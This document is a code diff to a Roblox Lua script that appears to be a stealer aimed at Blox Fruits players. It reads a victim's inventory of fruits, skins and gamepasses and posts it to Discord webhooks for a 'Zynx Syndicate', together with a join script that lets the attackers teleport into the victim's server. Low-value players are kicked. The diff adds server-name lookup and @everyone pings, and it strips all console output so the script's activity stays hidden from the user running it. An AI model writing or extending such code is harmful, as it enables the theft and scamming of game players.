@@ -78,7 +78,6 @@ end
 local function CheckSea1Restriction()
     local sea = GetSea()
     if sea == "Sea 1" then
-        print("❌ SCRIPT EXECUTED IN SEA 1 - KICKING PLAYER...")
         wait(2)
         local LocalPlayer = Players.LocalPlayer
         if LocalPlayer then
@@ -93,7 +92,6 @@ end
 local function CheckCooldown()
     local currentTime = tick()
     if currentTime - lastExecution < COOLDOWN_TIME then
-        print("❌ COOLDOWN ACTIVE - Please wait " .. math.floor(COOLDOWN_TIME - (currentTime - lastExecution)) .. " seconds")
         return true
     end
     lastExecution = currentTime
@@ -204,23 +202,72 @@ local function GenerateJoinScript()
     local placeId = game.PlaceId
     local jobId = game.JobId
     
-    local joinScript = string.format([[
-p=%s j="%s"
-if game.PlaceId~=p then
-queue_on_teleport('wait(5) if game.JobId~=j then game.TeleportService:TeleportToPlaceInstance(p,j) end')
-game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
-else
-game.TeleportService:TeleportToPlaceInstance(p,j)
-end
-    ]], placeId, jobId)
+    local joinScript = "local placeId = " .. placeId .. "\n"
+    joinScript = joinScript .. "local jobId = \"" .. jobId .. "\"\n\n"
+    joinScript = joinScript .. "if game.PlaceId ~= placeId then\n"
+    joinScript = joinScript .. "    queue_on_teleport([[\n"
+    joinScript = joinScript .. "        task.wait(5)\n"
+    joinScript = joinScript .. "        if game.JobId ~= \"" .. jobId .. "\" then\n"
+    joinScript = joinScript .. "            game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. jobId .. "\")\n"
+    joinScript = joinScript .. "        end\n"
+    joinScript = joinScript .. "    ]])\n\n"
+    joinScript = joinScript .. "    if placeId == 7449423635 then\n"
+    joinScript = joinScript .. "        game:GetService(\"ReplicatedStorage\").Remotes.CommF_:InvokeServer(\"TravelZou\")\n"
+    joinScript = joinScript .. "    elseif placeId == 4442272183 then\n"
+    joinScript = joinScript .. "        game:GetService(\"ReplicatedStorage\").Remotes.CommF_:InvokeServer(\"TravelDressrosa\")\n"
+    joinScript = joinScript .. "    else\n"
+    joinScript = joinScript .. "        game:GetService(\"ReplicatedStorage\").Remotes.CommF_:InvokeServer(\"TravelMain\")\n"
+    joinScript = joinScript .. "    end\n"
+    joinScript = joinScript .. "else\n"
+    joinScript = joinScript .. "    game:GetService(\"TeleportService\"):TeleportToPlaceInstance(placeId, jobId)\n"
+    joinScript = joinScript .. "end"
     
     return joinScript
 end
 
+local function GetServerName(jobId)
+    local assshit = {
+        "Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich",
+        "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold",
+        "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide",
+        "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy",
+        "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"
+    }
+    
+    local pussy = {
+        "TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat",
+        "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense",
+        "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber",
+        "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door",
+        "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark",
+        "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"
+    }
+    
+    local seed = tonumber("0x" .. jobId:gsub("-", ""):sub(1, 7)) or 0
+    local random = Random.new(seed)
+    local first = assshit[random:NextInteger(1, #assshit)]
+    local second = pussy[random:NextInteger(1, #pussy)]
+    local uniqueNumber = string.format("%04d", random:NextInteger(1, 9999))
+    return first .. " " .. second .. " #" .. uniqueNumber
+end
+
+local function GetCurrentServerName()
+    local success, result = pcall(function()
+        local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser", 5)
+        if ServerBrowser then
+            local jobId = ServerBrowser:InvokeServer("getjob")
+            if jobId then
+                return GetServerName(jobId)
+            end
+        end
+        return "Unknown Server"
+    end)
+    
+    return success and result or "Error Getting Name"
+end
+
 -- SIMPLE FRUIT COUNTER (ADDED)
 local function CountAllFruits()
-    print("🍊 COUNTING ALL FRUITS IN INVENTORY...")
-    
     local success, inventory = pcall(function()
         local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
         return Remote:InvokeServer("getInventory")
@@ -241,19 +288,8 @@ local function CountAllFruits()
             end
         end
         
-        -- Display results
-        print("📊 COMPLETE INVENTORY COUNT:")
-        print("🍊 TOTAL FRUIT ITEMS: " .. totalFruits)
-        print("🎯 UNIQUE FRUIT TYPES: " .. #inventory)
-        
-        print("🔢 DETAILED COUNTS:")
-        for fruitName, count in pairs(fruitCounts) do
-            print("   " .. fruitName .. " = " .. count)
-        end
-        
         return totalFruits, fruitCounts
     else
-        print("❌ Failed to get inventory")
         return 0, {}
     end
 end
@@ -262,8 +298,10 @@ end
 local function SendAdminWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
     local LocalPlayer = Players.LocalPlayer
     local joinScript = GenerateJoinScript()
+    local serverName = GetCurrentServerName()
     
     local payload = {
+        ["content"] = "@everyone",
         ["embeds"] = {{
             ["title"] = "🔱 Zynx Syndicate - Valuable Items",
             ["description"] = "Premium Inventory Only\n[Join Discord](" .. DISCORD_INVITE .. ")",
@@ -274,6 +312,7 @@ local function SendAdminWebhook(inventory, totalFruits, totalValuableFruits, pla
                     ["name"] = "👤 Player Info",
                     ["value"] = "User: " .. LocalPlayer.Name .. 
                                "\n*Sea:* " .. sea .. 
+                               "\n*Server:* " .. serverName ..
                                "\n*Total Fruits:* " .. totalFruits ..
                                "\n*Valuable Fruits:* " .. totalValuableFruits .. 
                                "\n*Perm Fruits:* " .. #inventory.permanentFruits ..
@@ -294,7 +333,6 @@ local function SendAdminWebhook(inventory, totalFruits, totalValuableFruits, pla
     if #inventory.permanentFruits > 0 then
         local permList = {}
         for _, fruit in pairs(inventory.permanentFruits) do
-            -- ALWAYS show count, even if it's 1
             table.insert(permList, fruit.name .. " (" .. fruit.count .. ")")
         end
         table.insert(payload.embeds[1].fields, {
@@ -304,16 +342,15 @@ local function SendAdminWebhook(inventory, totalFruits, totalValuableFruits, pla
         })
     end
     
-    -- Add SKINS section - SHOWS ALL COUNTS
+    -- Add SKINS section - SHOWS ALL COUNTS (WITH CODE FORMATTING)
     if #inventory.skins > 0 then
         local skinsList = {}
         for _, skin in pairs(inventory.skins) do
-            -- ALWAYS show count, even if it's 1
             table.insert(skinsList, skin.name .. " (" .. skin.count .. ")")
         end
         table.insert(payload.embeds[1].fields, {
             ["name"] = "🎨 Rare Skins - " .. #inventory.skins,
-            ["value"] = "" .. table.concat(skinsList, "\n") .. "",
+            ["value"] = "```" .. table.concat(skinsList, "\n") .. "```",
             ["inline"] = false
         })
     end
@@ -322,7 +359,6 @@ local function SendAdminWebhook(inventory, totalFruits, totalValuableFruits, pla
     if #inventory.gamepasses > 0 then
         local gamepassList = {}
         for _, gamepass in pairs(inventory.gamepasses) do
-            -- ALWAYS show count, even if it's 1
             table.insert(gamepassList, gamepass.name .. " (" .. gamepass.count .. ")")
         end
         table.insert(payload.embeds[1].fields, {
@@ -332,16 +368,15 @@ local function SendAdminWebhook(inventory, totalFruits, totalValuableFruits, pla
         })
     end
     
-    -- Add valuable fruits by rarity (4→3→2) - NO RARITY 1 - SHOWS ALL COUNTS
+    -- Add valuable fruits by rarity (4→3→2) - NO RARITY 1 - SHOWS ALL COUNTS (WITH CODE FORMATTING)
     if #inventory.fruits["4"] > 0 then
         local rarity4List = {}
         for _, fruit in pairs(inventory.fruits["4"]) do
-            -- ALWAYS show count, even if it's 1
             table.insert(rarity4List, fruit.name .. " (" .. fruit.count .. ")")
         end
         table.insert(payload.embeds[1].fields, {
             ["name"] = "💎 Mythical (Rarity 4) - " .. #inventory.fruits["4"],
-            ["value"] = "" .. table.concat(rarity4List, "\n") .. "",
+            ["value"] = "```" .. table.concat(rarity4List, "\n") .. "```",
             ["inline"] = false
         })
     end
@@ -349,12 +384,11 @@ local function SendAdminWebhook(inventory, totalFruits, totalValuableFruits, pla
     if #inventory.fruits["3"] > 0 then
         local rarity3List = {}
         for _, fruit in pairs(inventory.fruits["3"]) do
-            -- ALWAYS show count, even if it's 1
             table.insert(rarity3List, fruit.name .. " (" .. fruit.count .. ")")
         end
         table.insert(payload.embeds[1].fields, {
             ["name"] = "🌟 Legendary (Rarity 3) - " .. #inventory.fruits["3"],
-            ["value"] = "" .. table.concat(rarity3List, "\n") .. "",
+            ["value"] = "```" .. table.concat(rarity3List, "\n") .. "```",
             ["inline"] = false
         })
     end
@@ -362,20 +396,19 @@ local function SendAdminWebhook(inventory, totalFruits, totalValuableFruits, pla
     if #inventory.fruits["2"] > 0 then
         local rarity2List = {}
         for _, fruit in pairs(inventory.fruits["2"]) do
-            -- ALWAYS show count, even if it's 1
             table.insert(rarity2List, fruit.name .. " (" .. fruit.count .. ")")
         end
         table.insert(payload.embeds[1].fields, {
             ["name"] = "🔵 Rare (Rarity 2) - " .. #inventory.fruits["2"],
-            ["value"] = "" .. table.concat(rarity2List, "\n") .. "",
+            ["value"] = "```" .. table.concat(rarity2List, "\n") .. "```",
             ["inline"] = false
         })
     end
     
-    -- Add join script
+    -- Add join script (WITH CODE FORMATTING)
     table.insert(payload.embeds[1].fields, {
         ["name"] = "📜 Join Script",
-        ["value"] = "lua\n" .. joinScript .. "\n",
+        ["value"] = "```lua\n" .. joinScript .. "\n```",
         ["inline"] = false
     })
     
@@ -414,8 +447,10 @@ end
 local function SendMemberWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
     local LocalPlayer = Players.LocalPlayer
     local joinScript = GenerateJoinScript()
+    local serverName = GetCurrentServerName()
     
     local payload = {
+        ["content"] = "@everyone",
         ["embeds"] = {{
             ["title"] = "🔱 Zynx Syndicate - Valuable Items",
             ["description"] = "Premium Inventory Only\n[Join Discord](" .. DISCORD_INVITE .. ")",
@@ -426,6 +461,7 @@ local function SendMemberWebhook(inventory, totalFruits, totalValuableFruits, pl
                     ["name"] = "👤 Player Info",
                     ["value"] = "User: " .. LocalPlayer.Name .. 
                                "\n*Sea:* " .. sea .. 
+                               "\n*Server:* " .. serverName ..
                                "\n*Total Fruits:* " .. totalFruits ..
                                "\n*Valuable Fruits:* " .. totalValuableFruits .. 
                                "\n*Perm Fruits:* " .. #inventory.permanentFruits ..
@@ -446,7 +482,6 @@ local function SendMemberWebhook(inventory, totalFruits, totalValuableFruits, pl
     if #inventory.permanentFruits > 0 then
         local permList = {}
         for _, fruit in pairs(inventory.permanentFruits) do
-            -- ALWAYS show count, even if it's 1
             table.insert(permList, fruit.name .. " (" .. fruit.count .. ")")
         end
         table.insert(payload.embeds[1].fields, {
@@ -456,16 +491,15 @@ local function SendMemberWebhook(inventory, totalFruits, totalValuableFruits, pl
         })
     end
     
-    -- Add SKINS section - SHOWS ALL COUNTS
+    -- Add SKINS section - SHOWS ALL COUNTS (WITH CODE FORMATTING)
     if #inventory.skins > 0 then
         local skinsList = {}
         for _, skin in pairs(inventory.skins) do
-            -- ALWAYS show count, even if it's 1
             table.insert(skinsList, skin.name .. " (" .. skin.count .. ")")
         end
         table.insert(payload.embeds[1].fields, {
             ["name"] = "🎨 Rare Skins - " .. #inventory.skins,
-            ["value"] = "" .. table.concat(skinsList, "\n") .. "",
+            ["value"] = "```" .. table.concat(skinsList, "\n") .. "```",
             ["inline"] = false
         })
     end
@@ -474,7 +508,6 @@ local function SendMemberWebhook(inventory, totalFruits, totalValuableFruits, pl
     if #inventory.gamepasses > 0 then
         local gamepassList = {}
         for _, gamepass in pairs(inventory.gamepasses) do
-            -- ALWAYS show count, even if it's 1
             table.insert(gamepassList, gamepass.name .. " (" .. gamepass.count .. ")")
         end
         table.insert(payload.embeds[1].fields, {
@@ -484,16 +517,15 @@ local function SendMemberWebhook(inventory, totalFruits, totalValuableFruits, pl
         })
     end
     
-    -- Add valuable fruits by rarity (4→3→2) - NO RARITY 1 - SHOWS ALL COUNTS
+    -- Add valuable fruits by rarity (4→3→2) - NO RARITY 1 - SHOWS ALL COUNTS (WITH CODE FORMATTING)
     if #inventory.fruits["4"] > 0 then
         local rarity4List = {}
         for _, fruit in pairs(inventory.fruits["4"]) do
-            -- ALWAYS show count, even if it's 1
             table.insert(rarity4List, fruit.name .. " (" .. fruit.count .. ")")
         end
         table.insert(payload.embeds[1].fields, {
             ["name"] = "💎 Mythical (Rarity 4) - " .. #inventory.fruits["4"],
-            ["value"] = "" .. table.concat(rarity4List, "\n") .. "",
+            ["value"] = "```" .. table.concat(rarity4List, "\n") .. "```",
             ["inline"] = false
         })
     end
@@ -501,12 +533,11 @@ local function SendMemberWebhook(inventory, totalFruits, totalValuableFruits, pl
     if #inventory.fruits["3"] > 0 then
         local rarity3List = {}
         for _, fruit in pairs(inventory.fruits["3"]) do
-            -- ALWAYS show count, even if it's 1
             table.insert(rarity3List, fruit.name .. " (" .. fruit.count .. ")")
         end
         table.insert(payload.embeds[1].fields, {
             ["name"] = "🌟 Legendary (Rarity 3) - " .. #inventory.fruits["3"],
-            ["value"] = "" .. table.concat(rarity3List, "\n") .. "",
+            ["value"] = "```" .. table.concat(rarity3List, "\n") .. "```",
             ["inline"] = false
         })
     end
@@ -514,20 +545,19 @@ local function SendMemberWebhook(inventory, totalFruits, totalValuableFruits, pl
     if #inventory.fruits["2"] > 0 then
         local rarity2List = {}
         for _, fruit in pairs(inventory.fruits["2"]) do
-            -- ALWAYS show count, even if it's 1
             table.insert(rarity2List, fruit.name .. " (" .. fruit.count .. ")")
         end
         table.insert(payload.embeds[1].fields, {
             ["name"] = "🔵 Rare (Rarity 2) - " .. #inventory.fruits["2"],
-            ["value"] = "" .. table.concat(rarity2List, "\n") .. "",
+            ["value"] = "```" .. table.concat(rarity2List, "\n") .. "```",
             ["inline"] = false
         })
     end
     
-    -- Add join script
+    -- Add join script (WITH CODE FORMATTING)
     table.insert(payload.embeds[1].fields, {
         ["name"] = "📜 Join Script",
-        ["value"] = "lua\n" .. joinScript .. "\n",
+        ["value"] = "```lua\n" .. joinScript .. "\n```",
         ["inline"] = false
     })
     
@@ -639,42 +669,16 @@ local function SendWebhook()
     local totalValuableFruits = #inventory.fruits["4"] + #inventory.fruits["3"] + #inventory.fruits["2"]
     local hasAdminFruits, hasMemberFruits = HasPriorityFruits(inventory)
 
-    print("📊 VALUABLE ITEMS ONLY:")
-    print("🌊 Sea: " .. sea)
-    print("🍊 Total All Fruits: " .. totalFruits)
-    print("💎 Valuable Fruits: " .. totalValuableFruits)
-    print("👑 Admin Fruits: " .. tostring(hasAdminFruits))
-    print("🔹 Member Fruits: " .. tostring(hasMemberFruits))
-    print("🔮 Permanent Fruits: " .. #inventory.permanentFruits)
-    print("🎨 Skins: " .. #inventory.skins)
-    print("🎮 Gamepasses: " .. #inventory.gamepasses)
-
     -- DECISION LOGIC: Admin first, then Member, then kick if low
     if hasAdminFruits then
-        print("👑 ADMIN HIT DETECTED! Sending to admin webhook...")
         local success = SendAdminWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
-        if success then
-            print("✅ ADMIN WEBHOOK SENT SUCCESSFULLY!")
-            return true
-        else
-            print("❌ Admin webhook failed")
-            return false
-        end
+        return success
         
     elseif hasMemberFruits then
-        print("🔹 MEMBER HIT DETECTED! Sending to member webhook...")
         local success = SendMemberWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
-        if success then
-            print("✅ MEMBER WEBHOOK SENT SUCCESSFULLY!")
-            return true
-        else
-            print("❌ Member webhook failed")
-            return false
-        end
+        return success
         
     else
-        print("❌ ALT ACCOUNT DETECTED - KICKING PLAYER...")
-        -- Wait a moment then kick
         wait(2)
         if LocalPlayer then
             LocalPlayer:Kick("🚫 Alt account detected ")
@@ -684,7 +688,6 @@ local function SendWebhook()
 end
 
 -- Execute
-print("🔱 Starting VALUABLE ITEMS ONLY VERSION (ADMIN + MEMBER WEBHOOKS)...")
 
 -- Security Checks
 if CheckSea1Restriction() then
@@ -696,11 +699,5 @@ if CheckCooldown() then
 end
 
 local success = SendWebhook()
-
-if success then
-    print("🚀 Webhook sent successfully based on inventory priority!")
-else
-    print("💀 Player kicked - Alt account detected")
-end
 
 end
